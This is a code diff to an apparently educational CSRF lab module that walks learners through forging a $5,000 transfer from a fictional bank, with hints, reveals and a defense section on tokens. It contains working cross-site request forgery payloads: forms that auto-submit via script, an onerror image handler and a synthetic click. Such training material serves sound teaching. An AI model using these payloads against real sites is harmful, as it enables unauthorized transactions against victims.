@@ -4385,7 +4385,7 @@ const LAB_CSRF = {
   consoleLabel:"Your attack page (HTML)", defaultQ:"<h1>Free pizza coupon 🍕</h1>",
   presets:[ {q:"<h1>Free pizza coupon 🍕</h1>",label:"A harmless page"},
             {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="1"><input type="submit" value="Claim"></form>',label:"The form — but it needs a click"},
-            {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><script>document.forms[0].submit()</script>',label:"The full attack", spoiler:true} ],
+            {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><script>document.forms[0].submit()<\/script>',label:"The full attack", spoiler:true} ],
   challenge:{ steps:[
     { id:"form", label:"Point a form at the bank's transfer endpoint",
       test:a => a.form && a.bank && a.post,
@@ -4395,13 +4395,13 @@ const LAB_CSRF = {
     { id:"auto", label:"Make it submit itself — no click",
       test:a => a.auto,
       hints:["The victim will not click anything. Script it.",
-             "Append <script>document.forms[0].submit()</script>"],
-      reveal:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="1"></form><script>document.forms[0].submit()</script>' },
+             "Append <script>document.forms[0].submit()<\/script>"],
+      reveal:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="1"></form><script>document.forms[0].submit()<\/script>' },
     { id:"steal", label:"Move $5,000 out of the victim's account",
       test:a => a.fires && a.amount >= 5000,
       hints:["Everything is in place — set the amount input to 5000.",
              '<input name="amount" value="5000">'],
-      reveal:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><script>document.forms[0].submit()</script>' }
+      reveal:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><script>document.forms[0].submit()<\/script>' }
   ]},
   analyze(q){ return { q:String(q), ...csrfScan(q) }; },
   solved: a => !!a.fires,
@@ -4495,9 +4495,9 @@ const LAB_CSRF = {
   defense:{
     blurb:"A token the attacker can't read, a cookie that won't travel, or an Origin check — versus two very popular non-fixes.",
     vectors:[
-      {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><script>document.forms[0].submit()</script>', label:"script auto-submit"},
+      {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><script>document.forms[0].submit()<\/script>', label:"script auto-submit"},
       {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"></form><img src=x onerror="document.forms[0].submit()">', label:"handler auto-submit"},
-      {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"><input type="submit" autofocus></form><script>document.forms[0][document.forms[0].length-1].click()</script>', label:"synthetic click"}
+      {q:'<form action="https://bank.aperture.lab/api/transfer" method="POST"><input name="amount" value="5000"><input type="submit" autofocus></form><script>document.forms[0][document.forms[0].length-1].click()<\/script>', label:"synthetic click"}
     ],
     options:[
       { id:"token", label:"Per-session CSRF token", code:`<input type="hidden" name="csrf" value="{{ session.csrf }}">\n…\nif request.form["csrf"] != session.csrf: abort(403)`,
